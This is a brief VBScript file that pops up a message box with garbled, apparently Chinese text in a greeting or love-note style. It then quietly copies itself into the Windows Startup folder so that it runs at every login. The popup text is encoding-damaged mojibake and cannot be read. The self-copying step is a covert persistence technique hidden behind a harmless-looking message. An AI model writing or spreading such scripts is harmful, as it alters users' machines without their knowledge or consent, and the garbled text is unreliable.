msgbox"С�ɰ���"+chr(13)+"������������ڵ�ҹ���Ҷ��Էŷ��˵��Ĵ���ҹ�ĺڣ�������Ǳ�������������ǰ��ĬĬ�ؿ����㣬�������ޱȵĳ�����"+chr(13)+"�Ҿ������㶷�죬��ʵ����Ϊ��ġ�"+chr(13)+"ֻΪ����˵����"+chr(13)+"ÿһ�ε���������������������"+chr(13)+"���Ц���������ӡ���ҵ�����"+chr(13)+"                                                                                        ��������",1,"�����ʼ����ѣ�"
set fso = createobject("scripting.filesystemobject")
set ws = createobject("wscript.shell")
pt = ws.specialfolders("startup") & "\"
set file = fso.getfile(wscript.scriptfullname)
file.copy pt